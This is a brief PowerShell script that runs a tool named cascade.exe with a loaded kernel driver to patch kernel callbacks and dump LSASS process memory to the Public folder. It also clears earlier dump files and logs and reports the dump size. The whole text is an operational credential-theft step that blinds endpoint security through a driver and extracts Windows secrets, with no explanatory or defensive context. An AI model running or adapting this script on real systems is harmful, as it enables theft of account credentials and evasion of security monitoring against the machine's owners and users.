$pub = $env:PUBLIC
Remove-Item "$pub\lsass.dmp" -Force -ErrorAction SilentlyContinue
Remove-Item "$pub\cascade.log" -Force -ErrorAction SilentlyContinue
& "$pub\cascade.exe" --driver "$pub\BiosToolCommonDriver.sys" --patch-callbacks --dump --out "$pub\lsass.dmp" --no-xor 2>&1 | Tee-Object "$pub\cascade.log"
$sz = (Get-Item "$pub\lsass.dmp" -ErrorAction SilentlyContinue).Length
Write-Host "DUMP_SIZE:$sz"
